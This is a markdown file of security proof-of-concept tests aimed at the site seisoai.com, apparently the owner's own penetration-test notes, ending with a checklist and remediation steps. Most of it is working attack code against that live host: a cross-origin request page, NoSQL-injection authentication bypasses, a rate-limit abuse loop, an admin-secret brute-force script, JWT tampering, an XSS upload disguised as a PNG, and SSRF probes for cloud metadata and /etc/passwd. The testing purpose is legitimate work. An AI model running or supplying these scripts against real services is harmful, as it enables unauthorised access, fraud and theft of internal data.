# Security Proof of Concept - Vulnerability Demonstrations

⚠️ **WARNING: These are for security testing only. Do not use against systems you don't own.**

## 1. CORS Vulnerability Test

### Test: Permissive CORS Allows Cross-Origin Requests

```html
<!-- evil-site.com/index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>CORS Attack POC</title>
</head>
<body>
    <h1>CORS Vulnerability Test</h1>
    <button onclick="testCORS()">Test CORS</button>
    <div id="result"></div>

    <script>
        async function testCORS() {
            // If CORS is permissive, this will succeed
            try {
                const response = await fetch('https://seisoai.com/api/auth/verify', {
                    method: 'GET',
                    credentials: 'include',
                    headers: {
                        'Authorization': 'Bearer <stolen_token_here>'
                    }
                });
                
                const data = await response.json();
                document.getElementById('result').innerHTML = 
                    '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            } catch (error) {
                document.getElementById('result').innerHTML = 
                    'CORS blocked: ' + error.message;
            }
        }
    </script>
</body>
</html>
```

**Expected Result:** If CORS is permissive, the request succeeds and user data is exposed.

---

## 2. NoSQL Injection Test

### Test: Bypass Authentication with NoSQL Injection

```bash
# Attempt to find user with NoSQL injection
curl -X POST https://seisoai.com/api/auth/signin \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$ne": null},
    "password": {"$ne": null}
  }'
```

**Expected Result:** If sanitization fails, this might bypass authentication.

### Test: Extract Data with NoSQL Injection

```bash
# Attempt to extract user data
curl -X GET "https://seisoai.com/api/user/me?email[$ne]=null" \
  -H "Authorization: Bearer <token>"
```

---

## 3. Rate Limiting Bypass Test

### Test: Bypass Free Image Rate Limit

```javascript
// Create authenticated account first
const signupResponse = await fetch('https://seisoai.com/api/auth/signup', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        email: 'test@example.com',
        password: 'Test1234!@#$'
    })
});

const { token } = await signupResponse.json();

// Now make unlimited free image requests
for (let i = 0; i < 1000; i++) {
    await fetch('https://seisoai.com/api/generate/free-image', {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            prompt: 'test image',
            userId: 'test-user-id'
        })
    });
    console.log(`Request ${i} sent`);
}
```

**Expected Result:** All requests succeed because authenticated users bypass rate limiting.

---

## 4. Admin Secret Brute Force Test

### Test: Brute Force Admin Secret

```python
import requests
import itertools
import string

# Common admin secrets to try
common_secrets = [
    'admin',
    'password',
    'secret',
    '12345678',
    # Add more common secrets
]

base_url = 'https://seisoai.com/api/admin'

for secret in common_secrets:
    response = requests.post(
        f'{base_url}/add-credits',
        headers={
            'Authorization': f'Bearer {secret}',
            'Content-Type': 'application/json'
        },
        json={
            'userId': 'test-user',
            'credits': 1000
        }
    )
    
    if response.status_code == 200:
        print(f'SUCCESS! Admin secret found: {secret}')
        break
    elif response.status_code != 403:
        print(f'Unexpected status: {response.status_code} for secret: {secret}')
```

**Expected Result:** If admin secret is weak, it can be brute forced.

---

## 5. JWT Token Manipulation Test

### Test: Modify JWT Token

```javascript
// Decode JWT token (without verification)
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
const parts = token.split('.');
const payload = JSON.parse(atob(parts[1]));

// Modify payload
payload.userId = 'admin-user-id';
payload.email = 'admin@seisoai.com';

// Re-encode (this won't work without secret, but shows the concept)
const newPayload = btoa(JSON.stringify(payload));
const newToken = `${parts[0]}.${newPayload}.${parts[2]}`;

// Attempt to use modified token
fetch('https://seisoai.com/api/admin/add-credits', {
    headers: {
        'Authorization': `Bearer ${newToken}`
    }
});
```

**Expected Result:** If JWT_SECRET is weak or leaked, tokens can be forged.

---

## 6. File Upload Bypass Test

### Test: Upload Malicious File with Valid Magic Bytes

```javascript
// Create a file that looks like an image but contains malicious code
const maliciousImage = new Blob([
    // Valid PNG magic bytes
    new Uint8Array([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
    // Followed by malicious payload
    new TextEncoder().encode('<script>alert("XSS")</script>')
], { type: 'image/png' });

// Convert to data URI
const reader = new FileReader();
reader.onload = async () => {
    const dataUri = reader.result;
    
    // Attempt to upload
    await fetch('https://seisoai.com/api/generate/image', {
        method: 'POST',
        headers: {
            'Authorization': 'Bearer <token>',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            image: dataUri,
            prompt: 'test'
        })
    });
};

reader.readAsDataURL(maliciousImage);
```

---

## 7. Token Blacklist Bypass Test

### Test: Use Revoked Token After Server Restart

```javascript
// 1. Login and get token
const loginResponse = await fetch('https://seisoai.com/api/auth/signin', {
    method: 'POST',
    body: JSON.stringify({ email: 'user@example.com', password: 'pass' })
});
const { token } = await loginResponse.json();

// 2. Logout (token blacklisted)
await fetch('https://seisoai.com/api/auth/logout', {
    method: 'POST',
    headers: { 'Authorization': `Bearer ${token}` }
});

// 3. Wait for server restart (or simulate)
// 4. Token should still work if blacklist is in-memory only
const testResponse = await fetch('https://seisoai.com/api/auth/me', {
    headers: { 'Authorization': `Bearer ${token}` }
});

console.log('Token still valid:', testResponse.status === 200);
```

**Expected Result:** If blacklist is in-memory, token works after restart.

---

## 8. SSRF Test (if URL validation fails)

### Test: SSRF via Image URL

```javascript
// Attempt to access internal services
const internalUrls = [
    'http://localhost:27017',  // MongoDB
    'http://127.0.0.1:6379',    // Redis
    'http://169.254.169.254/latest/meta-data/',  // AWS metadata
    'file:///etc/passwd',
];

for (const url of internalUrls) {
    try {
        await fetch('https://seisoai.com/api/generate/image', {
            method: 'POST',
            headers: {
                'Authorization': 'Bearer <token>',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                imageUrl: url,
                prompt: 'test'
            })
        });
    } catch (error) {
        console.log(`SSRF attempt failed for ${url}:`, error.message);
    }
}
```

**Expected Result:** If URL validation is weak, internal services might be accessible.

---

## 9. Information Disclosure Test

### Test: Extract Information from Error Messages

```javascript
// Try various endpoints with invalid input to get error messages
const tests = [
    { endpoint: '/api/auth/signin', body: { email: null, password: null } },
    { endpoint: '/api/user/me', headers: { 'Authorization': 'Bearer invalid' } },
    { endpoint: '/api/admin/add-credits', body: { credits: 'not-a-number' } },
];

for (const test of tests) {
    const response = await fetch(`https://seisoai.com${test.endpoint}`, {
        method: 'POST',
        headers: test.headers || { 'Content-Type': 'application/json' },
        body: JSON.stringify(test.body)
    });
    
    const error = await response.json();
    console.log(`Error from ${test.endpoint}:`, error);
    // Check if error reveals internal details
}
```

---

## 10. Session Fixation Test

### Test: Session Fixation Attack

```javascript
// 1. Attacker creates session/token
const attackerToken = 'attacker-controlled-token';

// 2. Trick user into using attacker's token
// (via XSS, MITM, or social engineering)

// 3. User performs actions with attacker's token
// Attacker can now see all user actions
```

---

## Testing Checklist

- [ ] CORS allows unauthorized origins
- [ ] NoSQL injection possible on user inputs
- [ ] Rate limiting can be bypassed
- [ ] Admin secret can be brute forced
- [ ] JWT tokens can be forged (if secret weak)
- [ ] File upload validation can be bypassed
- [ ] Token blacklist doesn't persist
- [ ] SSRF possible via URL parameters
- [ ] Error messages leak sensitive information
- [ ] Session management vulnerabilities

---

## Remediation Verification

After fixes are applied, verify:

1. ✅ CORS only allows whitelisted origins
2. ✅ NoSQL injection attempts are blocked
3. ✅ Rate limiting applies to all users
4. ✅ Admin endpoints require strong authentication
5. ✅ JWT secrets are strong and rotated
6. ✅ File uploads are strictly validated
7. ✅ Token blacklist persists across restarts
8. ✅ URL validation prevents SSRF
9. ✅ Error messages are generic
10. ✅ Sessions are properly managed

---

**Note:** These tests should only be run against systems you own or have explicit permission to test. Unauthorized testing is illegal.
